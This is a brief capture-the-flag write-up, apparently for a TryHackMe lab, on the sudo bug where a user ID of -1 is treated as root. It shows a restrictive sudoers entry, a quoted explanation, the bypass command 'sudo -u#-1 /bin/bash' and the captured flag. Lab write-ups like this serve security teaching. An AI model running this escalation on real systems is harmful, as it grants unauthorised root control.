# writeups


/etc/sudoers
`<user> ALL=(ALL:!root) NOPASSWD: ALL`


execute some command
`sudo -u#0 command`


```
Joe Vennix found that if you specify a UID of -1 (or its unsigned equivalent: 4294967295), 
Sudo would incorrectly read this as being 0 (i.e. root). This means that by specifying a UID of -1 
or 4294967295, you can execute a command as root, despite being explicitly prevented from doing so. 
It is worth noting that this will only work if you've been granted non-root sudo permissions for 
the command, as in the configuration above.

Practically, the application of this is as follows: sudo -u#-1 <command>
```
sudo -u#-1 /bin/bash

THM{l33t_s3cur1ty_bypass}

